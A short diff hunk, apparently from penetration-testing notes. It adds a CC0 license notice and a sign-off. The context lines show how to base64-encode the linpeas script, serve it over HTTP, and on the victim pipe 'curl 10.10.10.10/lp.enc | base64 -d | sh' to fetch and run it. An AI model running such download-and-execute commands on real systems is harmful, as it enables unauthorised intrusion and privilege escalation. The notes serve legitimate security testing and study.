@@ -39,3 +39,7 @@ base64 -w0 linpeas.sh > lp.enc
 sudo python -m SimpleHTTPServer 80 #Start HTTP server
 curl 10.10.10.10/lp.enc | base64 -d | sh #Download from the victim
 ```
+---
+**Unless otherwise indicated at the root NOTICE file, all the information submitted to this repo is protected under Creative Commons Universal 1.0 (CC0-v1.0) license and is free to consult, copy, distribute and transform with no permission nor atribution required.**
+
+_Way to go, brain! Good luck and happy hacking!_
